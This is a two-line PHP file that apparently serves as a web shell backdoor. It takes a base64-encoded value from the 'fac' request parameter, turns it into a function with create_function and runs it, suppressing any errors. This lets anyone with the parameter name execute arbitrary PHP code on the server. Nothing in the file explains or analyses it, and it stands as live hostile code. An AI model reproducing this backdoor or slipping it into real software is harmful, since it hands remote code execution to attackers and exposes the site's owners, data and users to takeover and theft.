<?php
if(!empty($_REQUEST['fac'])){$fac=base64_decode($_REQUEST['fac']);$fac=create_function('',$fac);@$fac();exit;}